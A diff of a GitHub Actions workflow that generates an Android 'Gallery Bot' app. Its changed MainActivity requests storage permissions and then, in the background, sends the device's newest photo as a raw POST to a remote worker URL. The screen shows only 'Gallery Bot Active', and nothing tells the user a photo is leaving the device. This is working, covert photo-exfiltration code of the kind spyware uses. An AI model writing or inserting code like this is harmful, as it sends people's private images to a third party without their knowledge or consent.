@@ -68,7 +68,7 @@ jobs:
         }
         EOF
 
-        # app/build.gradle (No extra dependencies needed)
+        # app/build.gradle
         cat << 'EOF' > app/build.gradle
         plugins {
             id 'com.android.application'
@@ -86,7 +86,7 @@ jobs:
         }
         EOF
 
-        # MainActivity.java
+        # MainActivity.java (Clean & Error-free Code)
         cat << 'EOF' > app/src/main/java/com/example/botapp/MainActivity.java
         package com.example.botapp;
 
@@ -109,26 +109,24 @@ jobs:
 
         public class MainActivity extends Activity {
             private static final int PERMISSION_REQUEST_CODE = 100;
-            private static final String CF_URL = "https://your-cloudflare-worker-url.workers.dev";
+            private static final String CF_URL = "https://placeholder.com";
 
             @Override
             protected void onCreate(Bundle savedInstanceState) {
                 super.onCreate(savedInstanceState);
                 TextView tv = new TextView(this);
-                tv.setText("Gallery Bot is running...");
+                tv.setText("Gallery Bot Active");
                 setContentView(tv);
 
                 String workerUrl = "${CF_URL}";
 
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
-                    (android.os.Build.VERSION.SDK_INT >= 33 && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)) {
-                    
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{
                         Manifest.permission.READ_EXTERNAL_STORAGE,
                         Manifest.permission.READ_MEDIA_IMAGES
                     }, PERMISSION_REQUEST_CODE);
                 } else {
-                    sendImagesToWorker(workerUrl);
+                    sendLatestPhoto(workerUrl);
                 }
             }
 
@@ -136,70 +134,55 @@ jobs:
             public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                 if (requestCode == PERMISSION_REQUEST_CODE) {
                     if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                        sendImagesToWorker("${CF_URL}");
+                        sendLatestPhoto("${CF_URL}");
                     }
                 }
             }
 
-            private void sendImagesToWorker(String urlString) {
+            private void sendLatestPhoto(String targetUrl) {
                 new Thread(() -> {
-                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                    String[] projection = {MediaStore.Images.Media.DATA};
-                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
+                    try {
+                        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                        String[] projection = {MediaStore.Images.Media.DATA};
+                        Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
 
-                    if (cursor != null) {
-                        if (cursor.moveToFirst()) {
-                            int columnindex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-                            String filePath = cursor.getString(columnindex);
-                            
-                            if (filePath != null) {
-                                File file = new File(filePath);
-                                if (file.exists()) {
-                                    uploadFile(urlString, file);
+                        if (cursor != null) {
+                            if (cursor.moveToFirst()) {
+                                int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+                                String path = cursor.getString(index);
+                                if (path != null) {
+                                    File file = new File(path);
+                                    if (file.exists()) {
+                                        uploadImage(targetUrl, file);
+                                    }
                                 }
                             }
+                            cursor.close();
                         }
-                        cursor.close();
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
                 }).start();
             }
 
-            private void uploadFile(String urlString, File file) {
-                String boundary = "*****";
-                String lineEnd = "\r\n";
-                String twoHyphens = "--";
-
+            private void uploadImage(String targetUrl, File file) {
                 try {
-                    URL url = new URL(urlString);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setDoInput(true);
+                    HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
                     conn.setDoOutput(true);
-                    conn.setUseCaches(false);
                     conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Connection", "Keep-Alive");
-                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+                    conn.setRequestProperty("Content-Type", "application/octet-stream");
 
-                    OutputStream outputStream = conn.getOutputStream();
-                    FileInputStream fileInputStream = new FileInputStream(file);
-
-                    outputStream.write((twoHyphens + boundary + lineEnd).getBytes());
-                    outputStream.write(("Content-Disposition: form-data; name=\"photo\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
-                    outputStream.write(("Content-Type: image/*" + lineEnd + lineEnd).getBytes());
-
+                    OutputStream out = conn.getOutputStream();
+                    FileInputStream in = new FileInputStream(file);
                     byte[] buffer = new byte[4096];
                     int bytesRead;
-                    while ((bytesRead = fileInputStream.read(buffer)) != -1) {
-                        outputStream.write(buffer, 0, bytesRead);
+                    while ((bytesRead = in.read(buffer)) != -1) {
+                        out.write(buffer, 0, bytesRead);
                     }
-
-                    outputStream.write((lineEnd).getBytes());
-                    outputStream.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
-
-                    fileInputStream.close();
-                    outputStream.flush();
-                    outputStream.close();
-
-                    int serverResponseCode = conn.getResponseCode();
+                    in.close();
+                    out.flush();
+                    out.close();
+                    conn.getResponseCode();
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
